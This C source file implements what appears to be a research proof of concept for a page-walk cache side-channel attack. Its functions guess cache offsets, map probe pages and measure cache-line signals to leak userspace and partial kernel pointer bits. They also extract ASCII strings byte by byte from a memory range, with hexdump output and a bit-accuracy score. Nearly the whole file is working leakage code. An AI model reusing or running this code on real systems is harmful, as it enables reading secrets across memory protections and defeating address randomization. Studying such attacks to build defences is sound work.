#include "leak.h"


// TODO mark where is this used? 
/*
   leak_pwsc_non_buffered - leaks just the nonbuffered value in addr
   input: addr
   output: uint64_t of non_buffered value
*/
uint64_t leak_pwsc_non_buffered(uint64_t addr, uint64_t *init_noise_filter) {
    // set up run_pwsc
    reset_noise_filter(); 
    if(init_noise_filter != NULL)
        for(int i = 0; i < ncache_lines; i++)
            noise_filter[i] = init_noise_filter[i];

    // call run_pwsc
    return get_non_buffered_value(addr);
}


struct pwsc_ans leak_pwsc_ptr(uint64_t addr, uint64_t *init_noise_filter) {
    // set up run_pwsc
    reset_noise_filter(); 
    if(init_noise_filter != NULL)
        for(int i = 0; i < ncache_lines; i++)
            noise_filter[i] = init_noise_filter[i];

    // call run_pwsc
    return run_pwsc(addr); 
}


/*
    leak_ascii: optimized function for ASCII characters --> we only need a page walk depth of 1 
*/
struct pwsc_ans leak_ascii(uint64_t addr, uint64_t *init_noise_filter, uint64_t previous_line) {
    // grab byte inital 6 bits 
    struct pwsc_ans init_pwsc_ans; init_pwsc_ans.va.va = 0; init_pwsc_ans.num_lines_found = 0;
    uint64_t initial_line = leak_pwsc_non_buffered(addr, init_noise_filter);
    // fprintf(stderr, "Found non-buffered line: %llu\n", initial_line);
    if(initial_line != ncache_lines) {
        init_pwsc_ans.va.vpn4_set = initial_line;
        init_pwsc_ans.num_lines_found = 1;

        if(previous_line != ncache_lines && initial_line != previous_line)
            fprintf(stderr, "[WARNING] previous line does not match this line\n"); // TODO retry if this is hit
    }
    else {
        init_pwsc_ans.va.vpn4_set = previous_line; // if no previous line this should be set to ncache_lines 
        init_pwsc_ans.num_lines_found = 0; // line technically not found 
    }

    // segfault guard
    if(init_pwsc_ans.va.vpn4_set > 31) {
        return init_pwsc_ans; 
    }

    // guess CO values till we find one 
    for(uint8_t co_guess = 0; co_guess < 4; co_guess++) {

        // create address 
        struct pwsc_ans guess = init_pwsc_ans; 
        guess.va.vpn4_co = co_guess<<1; // the LSB of VPN4 is always 0 

        // map it 
        // TODO implement retry if the mmap fails 
        char *va_buffer = mmap((void *)guess.va.va, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_FIXED_NOREPLACE, -1, 0);
        if(va_buffer == (void *)-1) {
            fprintf(stderr, "mmap in leak depth one failed :(\n");
            return init_pwsc_ans;
        }
        *va_buffer = 0x5A; // shouldn't be needed passed in populate flag 

        // check if guess is right 
        struct pwsc_ans status; status.va.va = 0;
        uint64_t found_line = leak_pwsc_non_buffered(addr, init_noise_filter); 
        status.num_lines_found = (found_line != ncache_lines);
        status.va.vpn4_set = found_line; 
        munmap((void *)guess.va.va, 4096); 

        // logic 
        if(status.num_lines_found == 1 && status.va.vpn4_set != init_pwsc_ans.va.vpn4_set) {
            guess.va.vpn3_set = status.va.vpn4_set; 
            return guess; 
        } else if (status.num_lines_found == 0 && init_pwsc_ans.num_lines_found == 1) { // we actually found an initial line 
            // TODO change this logic --> unncessarily complicated I think 
            return guess; 
        }
    }
    fprintf(stderr, "[WARNING] CACHE OFFSET UNKNOWN HERE .....\n");
    return init_pwsc_ans; 
}


/*
    leak_userspace_ptr: Leak full ptr of something that is in userspace 
    input: addr, init_noise_filter, and expected_vpn4_line (the expected signal vpn4)
    output: return pwsc_ans with leaked bits --> if kernel pointer we only leak 6 bits of every VPN that is mapped

    TODO we know some of the earlier bits --> allow that to be passed in instead of expected_vpn4_line 

    TODO technically just a code name for the memory map order oracle TBH
*/
struct pwsc_ans leak_userspace_ptr(uint64_t addr, uint64_t *init_noise_filter, uint64_t expected_vpn4_line) {
    // check depth + assert userspace 
    struct pwsc_ans init_profile = leak_pwsc_ptr(addr, init_noise_filter);

    // extract previous line + take in previous information if we have it 
    uint8_t vpn4_from_previous_info = 0; // track if vpn4 is from previous info for CO calculations
    if(init_profile.num_lines_found == 0) { // check to make sure we found something 
        // init_profile.va.vpn4_set = (uint8_t)expected_vpn4_line;
        // if(expected_vpn4_line != ncache_lines) init_profile.num_lines_found = 1;
        // vpn4_from_previous_info = 1; 
        // TODO reimplement this in the future 
    }
    else if(init_profile.va.vpn4_set != expected_vpn4_line) // just display a warning here 
        fprintf(stderr, "[WARNING] previous line does not match this line\n"); // TODO retry if this is hit

    // kernel space pointer
    if(init_profile.va.vpn4_set > 31 && init_profile.num_lines_found == 1) 
        return init_profile; 

    // userspace pointer gate --> return nothing for safety 
    if(init_profile.va.vpn4_set > 31 || init_profile.num_lines_found != 1) {
        init_profile.va.va = 0; 
        return init_profile;
    }

    // Set up return 
    struct pwsc_ans ret = init_profile; 

    // set up previous line or early return
    uint64_t previous_line = ncache_lines; 
    if(init_profile.num_lines_found == 1) previous_line = init_profile.va.vpn4_set;
    else if(init_profile.num_lines_found == 2) previous_line = init_profile.va.vpn3_set;
    else if(init_profile.num_lines_found == 3) previous_line = init_profile.va.vpn2_set;
    else goto return_ans; // userspace pointer SMAP protection (max is 4 lines) it is a valid pointer so just return what we found 

    // leak depth 
    // Should only get CO of VPN2 --> impossible to get PO due to SMAP 
    for(int cur_depth = init_profile.num_lines_found; cur_depth <= 4; cur_depth++) {
        for(uint8_t co_guess = 0; co_guess < 8; co_guess++) { // guess current CO values till we find one 

            // fill in guess
            if(cur_depth == 1) ret.va.vpn4_co = co_guess; 
            else if(cur_depth == 2) ret.va.vpn3_co = co_guess;
            else if(cur_depth == 3) ret.va.vpn2_co = co_guess; 
            else if(cur_depth == 4) ret.va.vpn1_co = co_guess; 

            // Preset next level's set to not a zero set  so that zero chunks aren't accidentally mapped 
            if(cur_depth <= 1) { 
                ret.va.vpn3_set = 32; 
                ret.va.vpn3_co = 6;
            }
            if(cur_depth <= 2) {
                ret.va.vpn2_set = 32;
                ret.va.vpn2_co = 6; 
            }
            if(cur_depth <= 3) {
                ret.va.vpn1_set = 32;
                ret.va.vpn1_co = 6;   
            }

            // map it 
            // TODO implement retry if the mmap fails 
            char *va_buffer = mmap((void *)ret.va.va, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_FIXED_NOREPLACE, -1, 0);
            if(va_buffer == (void *)-1) {
                fprintf(stderr, "mmap in leak depth one failed :(\n");
                goto return_ans; 
            }
            *va_buffer = 0x5A; // shouldn't be needed passed in populate flag 

            // check if guess is right 
            uint64_t found_line = leak_pwsc_non_buffered(addr, init_noise_filter); 
            munmap((void *)va_buffer, 4096); 

            // logic --> if found a line that is not the same as the previous line
            if(found_line != ncache_lines && found_line != previous_line) {
                fprintf(stderr, "Found non-buffered line: %llu\n", found_line); // TODO remove

                if(cur_depth == 1) ret.va.vpn3_set = found_line; 
                else if(cur_depth == 2) ret.va.vpn2_set = found_line; 
                else if(cur_depth == 3) ret.va.vpn1_set = found_line; 
                else if(cur_depth == 4) ret.va.po_set = found_line; 
                ret.num_lines_found++; 

                // update previous_line
                previous_line = found_line; 
                break; 
            } else if (found_line == ncache_lines && (cur_depth != 1 || !vpn4_from_previous_info)) { // found zeros lines but expected one line 
                fprintf(stderr, "[EXIT] Found non-buffered line: %llu\n", found_line); // TODO remove

                // logic: if we find no signal then we have found the correct CO if either we are not depth = 1 (working vpn4_co) OR we are depth = 1 but the vpn4 used is not from previous information 
                // logic: if the vpn4 is from previous info we should expect no found line as our initial measurements picked up no signal so the current state is no signal 
                // logic: we know the cache offset is correct but can't continue because we couldn't extract the next line 
                goto return_ans; 
            }
        }

        // found nothing
        if(ret.num_lines_found == (uint64_t)cur_depth) {
            fprintf(stderr, "[WARNING] Unable to determine CO and next cache set\n");
            goto return_ans; 
        }
    }

return_ans:
    // guard to make sure enough lines are found 
    // logic: we need at least 2 full PT indexes --> i.e. 3 lines need to be found 
    // logic: the reason why we only make sure two lines are recorded is because if num_lines_found == 2 then we had an early exit which means we found the full 2 lines anyways
    if(ret.num_lines_found < 3) ret.va.va = 0; // zero it out 

    // zero out PT indexes that haven't been found 
    if(ret.num_lines_found < 2) { 
        ret.va.vpn4_co = 0;
        ret.va.vpn3_set = 0; 
        ret.va.vpn3_co = 0;
    }
    if(ret.num_lines_found < 3) {
        ret.va.vpn3_co = 0;
        ret.va.vpn2_set = 0;
        ret.va.vpn2_co = 0; 
    }
    if(ret.num_lines_found < 4) {
        ret.va.vpn2_co = 0;
        ret.va.vpn1_set = 0;
        ret.va.vpn1_co = 0;   
    }
    if(ret.num_lines_found < 5) {
        ret.va.vpn1_co = 0;
        ret.va.po_set = 0;
        ret.va.po_co = 0; 
    }

    return ret; 
}


struct bit_map* leak_addr_range(uint64_t start_leak, uint64_t end_leak, uint64_t gran, uint64_t *init_noise_filter, uint64_t ascii_flag) {
    if(start_leak == 0) {
        fprintf(stderr, "start leak can't equal zero or else we will integer overflow!\n");
        return NULL; 
    }

    // create bit map 
    struct bit_map *ret = create_bit_map(end_leak - start_leak); 
    if(!ret) {
        fprintf(stderr, "Unable to allocate a bit map for leakage...\n");
        return NULL; 
    }
    
    // leak range 
    int byte_idx = 2;
    uint64_t previous_line = 64;
    for(uint64_t cur_addr = end_leak - 1; cur_addr >= start_leak; cur_addr -= gran) { 
        // calculate advanced noise filter 
        int PO = cur_addr % 4096; 
        int mid = (PO / ncache_lines) % ncache_lines;  // TODO enable this advanced filter via flag! 
        int advanced_filter[3] = {ncache_lines}; int adv_idx = 0; 
        for(int to_check = mid - 1; to_check <= mid + 1; to_check++)
            if( (64 * to_check - 7) <= PO && PO <= (64 * (to_check + 1)) ) // TODO recheck these numbers may be overestimating noise sometimes 
                advanced_filter[adv_idx++] = to_check;
        for(int i = 0; i < adv_idx; i++) {
            if(i != 0) init_noise_filter[advanced_filter[i] - 1] += 2; 
            init_noise_filter[advanced_filter[i]] += 2; 
            if(i != 63) init_noise_filter[advanced_filter[i] + 1] += 2; 
        }

        // retrive secret 
        struct pwsc_ans ans = {
            .va = { .va = 0 },
            .num_lines_found = 0
        };
        if(ascii_flag) ans = leak_ascii(cur_addr, init_noise_filter, previous_line);
        else ans = leak_userspace_ptr(cur_addr, init_noise_filter, previous_line); // TODO add in ascii hint 

        // in case of larger granularities need additional shifts 
        if(cur_addr != end_leak - 1) for(int i = 0; i < gran - 1; i++) shift_one_byte(ret); 

        // add it to the map 
        // only do the check with old values if we aren't the first profiled value 
        uint64_t status = add_ptr_to_bit_map(ret, ans.va.va, ans.num_lines_found, (cur_addr != end_leak - 1)); // we always expect page walk depth of 2 here
        // if(status == 1) { // TODO SMARTER ERROR HANDLING HERE!
        //     fprintf(stderr, "Correctness error, retrying...\n");
        //     cur_addr++; 
        // }
        (void) status; 

        // output leaked character
        if(ascii_flag) {
            fprintf(stderr, "Leaked character: <%c> Value: %d\n", (char) ret->bytes[byte_idx], ret->bytes[byte_idx]);
            extract_string(ret);
        }
        byte_idx += gran;

        // set up previous line here
        previous_line = VPN4_TO_CACHE_LINE((ans.va.va<<8));  

        // clear advanced noise filter
        for(int i = 0; i < adv_idx; i++) {
            if(i != 0) init_noise_filter[advanced_filter[i] - 1] -= 2; 
            init_noise_filter[advanced_filter[i]] -= 2; 
            if(i != 63) init_noise_filter[advanced_filter[i] + 1] -= 2; 
        }
    }
    
    return ret; 
}


/*
    Display leaked bits as a string from the byte map + hexdump
*/
void extract_string(struct bit_map *map) {
    char string_ans[1024] = {0};

    // ignore the dead bytes 
    // char *ans = string_ans + 5;
    // char *ans = string_ans;
    char *ans = NULL;
     
    fprintf(stderr, "hexdump: ");
    for(int i = 0; i <= map->cur_pos; i++) { // we need to flip the endianness of the byte map for strings (big endian to little endian )
        string_ans[i] = map->bytes[map->cur_pos - i];
        fprintf(stderr, "%02x(%c) ", map->bytes[map->cur_pos - i], (char)map->bytes[map->cur_pos - i]); 
        if(!ans && string_ans[i] != 0) ans = string_ans + i; // we pick up some bad zeros at the start --> remove them 
    }
    fprintf(stderr, "\n");

    // output extract string 
    fprintf(stderr, "Extracted string <%s>\n", ans); 

}

/*
    Bit accuracy 
    assumptions: bit_map->size = sizeof(correct)
*/
double accuracy(struct bit_map *guess, char *correct) {
    double correct_bits = 0.0; 
    double total_bits = (guess->cur_pos - 2) * 8.0; 
    for(uint64_t i = 2; i < guess->cur_pos; i++) {
        // fprintf(stderr, "%c %c\n", guess->bytes[guess->cur_pos - i], correct[i ]);

        for(uint64_t shift = 0; shift < 8; shift++) {
            if( (guess->bytes[guess->cur_pos - i] & (1<<shift)) == (correct[i ] & (1<<shift))) correct_bits += 1.0;
        }
    }
    fprintf(stderr, "Stats: %f/%f\n", correct_bits, total_bits);
    return (correct_bits / total_bits);
}